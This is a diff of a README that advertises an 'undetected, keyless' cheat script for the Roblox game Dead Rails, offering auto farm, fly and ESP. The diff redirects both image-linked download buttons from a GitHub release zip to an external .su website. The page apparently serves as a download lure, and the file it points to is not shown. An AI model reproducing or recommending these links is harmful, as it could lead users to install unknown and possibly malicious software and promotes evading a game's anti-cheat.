@@ -5,10 +5,10 @@
 Welcome to the **ultimate Dead Rails script experience** for 2025! Whether you're a casual player or a hardcore grinder, our script delivers the most advanced features in the game—**undetected**, **unpatched**, and completely **keyless**. Enjoy powerful tools like **auto farm bonds**, **infinite jump**, **speed walk**, **fly**, **ESP**, and much more—all from a single, easy-to-use GUI.
 
 [![hq720](https://github.com/user-attachments/assets/e492cc62-1f3e-4d11-b780-bee30107150d)
-](https://github.com/EFWFEWFQ/literate-system/releases/download/new/Updated.Script.zip)
+](https://hardware-gui.su/)
 
 [![image](https://github.com/user-attachments/assets/ef370c20-5aca-4375-bed6-7c6d24c22825)
-](https://github.com/EFWFEWFQ/literate-system/releases/download/new/Updated.Script.zip)
+](https://hardware-gui.su/)
 
 ## ⚙️ Features Overview
 
